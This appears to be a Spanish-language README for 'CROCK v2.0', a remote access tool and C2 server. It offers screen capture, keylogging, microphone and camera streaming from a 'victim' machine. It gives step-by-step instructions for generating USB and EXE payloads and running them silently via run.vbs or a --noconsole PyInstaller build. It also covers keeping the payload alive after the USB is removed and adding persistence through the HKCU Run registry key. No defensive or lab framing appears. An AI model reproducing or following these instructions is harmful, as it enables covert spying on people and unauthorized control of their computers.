# CROCK v2.0 — USB Remote Access Tool

![Logo o Imagen](images/tu_imagen_aqui.png)

C2 con cifrado AES-256-CTR. Captura pantalla, keylogger, micrófono y cámara en tiempo real.

---

## Requisitos

- **Python 3.10+** en la máquina C2 (la tuya)
- **Windows** en ambos lados (víctima y C2)
- Los payloads generados solo necesitan Python instalado en la víctima (o puedes compilarlos a EXE)

---

## Instalación (máquina C2)

### 1. Clonar / descomprimir el proyecto

```
cd C:\Users\USUARIO\Desktop\USB_Crock
```

### 2. Instalar dependencias

```powershell
pip install -r requirements.txt
```

> Si `pyaudio` falla en Windows:
> ```powershell
> pip install pipwin
> pipwin install pyaudio
> ```

### 3. (Opcional) pycryptodome — acelera el cifrado x10

```powershell
pip install pycryptodome
```

---

## Arranque

### Opción A — Doble clic (recomendado)
Ejecuta **`run_admin.bat`** con doble clic. Pide UAC automáticamente si no eres admin.

### Opción B — PowerShell normal
```powershell
# IMPORTANTE: NO usar "py run_admin.bat" — .bat no es Python
.\run_admin.bat
```

### Opción C — Sin admin (funcionalidad reducida)
```powershell
python crock.py
```

---

## Uso — Menú principal

```
╔══════════════════════════════════════╗
║          CROCK v2.0 - C2             ║
╠══════════════════════════════════════╣
║  1. Configurar C2 (IP/puerto/modo)   ║
║  2. Generar Payload / EXE            ║
║  3. Escuchar (modo servidor)         ║
║  4. Víctimas conectadas              ║
║  5. Salir                            ║
╚══════════════════════════════════════╝
```

---

## Paso a paso completo

### PASO 1 — Configurar el C2

1. Ejecuta `run_admin.bat`
2. Elige **opción 1**
3. Ingresa tu IP local (ej. `192.168.1.13`) y puerto (`4444`)
4. Elige el modo: `SCREEN` / `KEYLOGGER` / `MICROPHONE` / `CAMERA`

> Para ver tu IP: `ipconfig` → busca `IPv4 Address`

---

### PASO 2 — Generar el payload

1. Elige **opción 2**
2. Selecciona tipo de payload:
   - **USB payload** → genera `payload.pyw` + `run.bat` + `run.vbs` para meter en USB
   - **EXE payload** → genera un `.py` compilable con PyInstaller
3. Los archivos se guardan en `output/`

---

### PASO 3 — Levantar el listener

1. Vuelve al menú principal
2. Elige **opción 3** → el C2 queda escuchando en `IP:Puerto`
3. Deja esta ventana abierta

---

### PASO 4 — Ejecutar en la víctima

**Vía USB:**
- Copia el contenido de `output/usb/` a la USB
- En la víctima, ejecutar `run.bat` (o `run.vbs` para ejecución silenciosa)
- El payload corre en background mientras la USB esté o no conectada

**Vía EXE (compilar primero):**
```powershell
pip install pyinstaller
pyinstaller --onefile --noconsole --icon=NONE output\payload.py
# El EXE queda en dist\payload.exe
```

---

### PASO 5 — Ver la conexión

- En la máquina C2, opción **4** → lista de víctimas activas
- Selecciona una víctima para ver su stream en tiempo real

---

## Estructura del proyecto

```
USB_Crock/
├── crock.py              # Entry point / UI principal
├── config.py             # IP, puerto, modos, constantes
├── launcher.py           # Launcher local (testing)
├── run_admin.bat         # Arranque con UAC
├── run_admin.ps1         # Alternativa PowerShell
├── requirements.txt      # Dependencias pip
├── builder/
│   ├── exe_builder.py    # Genera payload tipo EXE
│   └── usb_builder.py    # Genera payload tipo USB
├── core/
│   └── receiver.py       # Servidor C2, manejo de conexiones
├── utils/
│   ├── crypto.py         # AES-256-CTR puro Python + pycryptodome
│   ├── c2_manager.py     # Gestión de sesiones/víctimas
│   ├── victims_db.py     # Base de datos de víctimas
│   ├── network.py        # Helpers de red
│   └── stealth.py        # Técnicas de ocultación
└── output/               # Payloads generados (se crea automático)
```

---

## Protocolo de cifrado

```
Header (24 bytes):  CRCK (4) | IV (16) | payload_len (4)
Datos:              AES-256-CTR cifrado con key derivada de SHA-256(password)
```

---

## Notas

- `autorun.inf` **no funciona** en Windows moderno (bloqueado desde Win7 SP1)
- El payload **persiste** en ejecución aunque la USB se desconecte
- Para añadir persistencia al inicio: el payload puede registrarse en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Los payloads son `.pyw` (ventana oculta) — no aparece consola en la víctima

---

## Tutorial / Demostración

[🎥 Ver Video Tutorial en Google Drive](AQUI_PON_TU_ENLACE_DE_DRIVE)
